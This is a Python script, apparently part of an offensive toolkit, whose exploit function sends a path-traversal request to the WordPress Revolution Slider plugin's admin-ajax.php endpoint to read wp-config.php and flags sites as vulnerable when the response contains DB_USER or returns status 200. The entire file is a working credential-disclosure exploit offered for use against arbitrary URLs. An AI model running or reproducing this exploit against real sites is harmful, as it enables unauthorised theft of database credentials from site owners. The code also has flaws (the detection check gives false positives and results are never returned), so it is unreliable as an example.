import sys
import os
try:
    # The insertion index should be 1 because index 0 is this file
    sys.path.insert(1, '{}/help'.format(os.getcwd()))  # the type of path is string
    # because the system path already have the absolute path to folder a
    # so it can recognize file_a.py while searching 
    from help.banner import colors
    from help.json_me import json_me
    from help.req import request
    
except (ModuleNotFoundError, ImportError) as e:
    print("{} fileure".format(type(e)))
else:
    print("Import succeeded")



def exploit(url):
    try:
        found = []
        req = request(url)
        if not (url.startswith('https://') or url.startswith('http://')):
            url = 'http://' + url
        cfg = "wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php"
        _response = req.get(url+cfg)
        if "DB_USER" in _response.text or _response.status_code == 200:
            print(colors.yellow + "[+] ==> Revslider %s Vulnerable"  %url)
            found.append({
                "url": url,
                "payload": url+cfg,
                "status": _response.status_code,
                "exploit": "Revslider Config",
            })
            
        else:
            print(colors.red + "[-] Revslider ==>  %s Not Vulnerable"  %url)

    except Exception as e:
        pass

